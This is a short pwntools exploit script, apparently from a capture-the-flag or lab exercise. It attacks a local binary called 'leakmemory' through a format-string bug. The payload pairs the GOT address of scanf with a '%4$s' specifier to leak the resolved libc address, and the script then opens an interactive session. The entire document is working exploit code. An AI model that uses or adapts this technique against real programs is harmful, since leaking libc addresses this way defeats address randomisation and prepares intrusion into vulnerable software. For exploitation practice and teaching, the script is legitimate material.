from pwn import *

p = process('./leakmemory')
elf = ELF('./leakmemory')

prin_addr = elf.got['__isoc99_scanf']
print hex(prin_addr)
playload = p32(prin_addr) + '%4$s'
#gdb.attach(p)
p.sendline(playload)
p.recvuntil('%4$s\n')
print hex(u32(p.recv()[4:8]))

p.interactive()
